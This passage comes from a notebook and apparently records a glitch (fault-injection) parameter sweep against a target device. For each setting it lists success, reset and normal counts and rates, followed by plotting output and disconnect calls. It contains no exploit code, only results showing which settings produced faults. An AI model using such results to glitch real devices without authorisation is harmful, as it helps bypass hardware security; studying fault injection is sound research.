#    'reset_rate': 0.6272455089820359,
#    'normal': 236,
#    'normal_rate': 0.3532934131736527}),
#  ((17,),
#   {'total': 658,
#    'success': 11,
#    'success_rate': 0.016717325227963525,
#    'reset': 421,
#    'reset_rate': 0.6398176291793313,
#    'normal': 226,
#    'normal_rate': 0.3434650455927052}),
#  ((36,),
#   {'total': 718,
#    'success': 12,
#    'success_rate': 0.016713091922005572,
#    'reset': 592,
#    'reset_rate': 0.8245125348189415,
#    'normal': 114,
#    'normal_rate': 0.15877437325905291}),
#  ((33,),
#   {'total': 411,
#    'success': 1,
#    'success_rate': 0.0024330900243309003,
#    'reset': 168,
#    'reset_rate': 0.40875912408759124,
#    'normal': 242,
#    'normal_rate': 0.5888077858880778}),
#  ((44,),
#   {'total': 412,
#    'success': 1,
#    'success_rate': 0.0024271844660194173,
#    'reset': 9,
#    'reset_rate': 0.021844660194174758,
#    'normal': 402,
#    'normal_rate': 0.9757281553398058}),
#  ((38,),
#   {'total': 592,
#    'success': 1,
#    'success_rate': 0.0016891891891891893,
#    'reset': 238,
#    'reset_rate': 0.40202702702702703,
#    'normal': 353,
#    'normal_rate': 0.5962837837837838}),
#  ((35,),
#   {'total': 716,
#    'success': 1,
#    'success_rate': 0.0013966480446927375,
#    'reset': 621,
#    'reset_rate': 0.86731843575419,
#    'normal': 94,
#    'normal_rate': 0.13128491620111732}),
#  ((45,),
#   {'total': 411,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 9,
#    'reset_rate': 0.021897810218978103,
#    'normal': 402,
#    'normal_rate': 0.9781021897810219}),
#  ((43,),
#   {'total': 411,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 9,
#    'reset_rate': 0.021897810218978103,
#    'normal': 402,
#    'normal_rate': 0.9781021897810219}),
#  ((42,),
#   {'total': 454,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 51,
#    'reset_rate': 0.11233480176211454,
#    'normal': 403,
#    'normal_rate': 0.8876651982378855}),
#  ((41,),
#   {'total': 612,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 254,
#    'reset_rate': 0.4150326797385621,
#    'normal': 358,
#    'normal_rate': 0.5849673202614379}),
#  ((40,),
#   {'total': 561,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 328,
#    'reset_rate': 0.5846702317290553,
#    'normal': 233,
#    'normal_rate': 0.41532976827094475}),
#  ((39,),
#   {'total': 458,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 175,
#    'reset_rate': 0.38209606986899564,
#    'normal': 283,
#    'normal_rate': 0.6179039301310044}),
#  ((34,),
#   {'total': 573,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 475,
#    'reset_rate': 0.8289703315881326,
#    'normal': 98,
#    'normal_rate': 0.17102966841186737}),
#  ((32,),
#   {'total': 408,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 6,
#    'reset_rate': 0.014705882352941176,
#    'normal': 402,
#    'normal_rate': 0.9852941176470589}),
#  ((31,),
#   {'total': 408,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 2,
#    'reset_rate': 0.004901960784313725,
#    'normal': 406,
#    'normal_rate': 0.9950980392156863}),
#  ((30,),
#   {'total': 408,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 0,
#    'reset_rate': 0.0,
#    'normal': 408,
#    'normal_rate': 1.0}),
#  ((29,),
#   {'total': 445,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 41,
#    'reset_rate': 0.09213483146067415,
#    'normal': 404,
#    'normal_rate': 0.9078651685393259}),
#  ((28,),
#   {'total': 563,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 195,
#    'reset_rate': 0.3463587921847247,
#    'normal': 368,
#    'normal_rate': 0.6536412078152753}),
#  ((25,),
#   {'total': 714,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 622,
#    'reset_rate': 0.8711484593837535,
#    'normal': 92,
#    'normal_rate': 0.12885154061624648}),
#  ((24,),
#   {'total': 577,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 476,
#    'reset_rate': 0.8249566724436742,
#    'normal': 101,
#    'normal_rate': 0.17504332755632582}),
#  ((23,),
#   {'total': 412,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 177,
#    'reset_rate': 0.42961165048543687,
#    'normal': 235,
#    'normal_rate': 0.5703883495145631}),
#  ((22,),
#   {'total': 408,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 9,
#    'reset_rate': 0.022058823529411766,
#    'normal': 399,
#    'normal_rate': 0.9779411764705882}),
#  ((21,),
#   {'total': 409,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 2,
#    'reset_rate': 0.004889975550122249,
#    'normal': 407,
#    'normal_rate': 0.9951100244498777}),
#  ((20,),
#   {'total': 409,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 7,
#    'reset_rate': 0.017114914425427872,
#    'normal': 402,
#    'normal_rate': 0.9828850855745721}),
#  ((19,),
#   {'total': 446,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 42,
#    'reset_rate': 0.09417040358744394,
#    'normal': 404,
#    'normal_rate': 0.905829596412556}),
#  ((18,),
#   {'total': 576,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 209,
#    'reset_rate': 0.3628472222222222,
#    'normal': 367,
#    'normal_rate': 0.6371527777777778}),
#  ((15,),
#   {'total': 717,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 618,
#    'reset_rate': 0.8619246861924686,
#    'normal': 99,
#    'normal_rate': 0.13807531380753138}),
#  ((14,),
#   {'total': 570,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 473,
#    'reset_rate': 0.8298245614035088,
#    'normal': 97,
#    'normal_rate': 0.17017543859649123}),
#  ((13,),
#   {'total': 409,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 167,
#    'reset_rate': 0.4083129584352078,
#    'normal': 242,
#    'normal_rate': 0.5916870415647921}),
#  ((12,),
#   {'total': 408,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 3,
#    'reset_rate': 0.007352941176470588,
#    'normal': 405,
#    'normal_rate': 0.9926470588235294}),
#  ((11,),
#   {'total': 410,
#    'success': 0,
#    'success_rate': 0.0,
#    'reset': 4,
#    'reset_rate': 0.00975609756097561,
#    'normal': 406,
#    'normal_rate': 0.9902439024390244})]

# %%
gc.plot_2d(alpha=False)
# Out:
# <style>*[data-root-id],
# *[data-root-id] > * {
#   box-sizing: border-box;
#   font-family: var(--jp-ui-font-family);
#   font-size: var(--jp-ui-font-size1);
#   color: var(--vscode-editor-foreground, var(--jp-ui-font-color1));
# }
#
# /* Override VSCode background color */
# .cell-output-ipywidget-background:has(
#     > .cell-output-ipywidget-background > .lm-Widget > *[data-root-id]
#   ),
# .cell-output-ipywidget-background:has(> .lm-Widget > *[data-root-id]) {
#   background-color: transparent !important;
# }
# </style>
# :Overlay
#    .Points.I       :Points   [x,y]
#    .Points.Success :Points   [width,offset]   (success_rate)
#    .Points.Reset   :Points   [width,offset]   (reset_rate)

# %%
scope.dis()
target.dis()
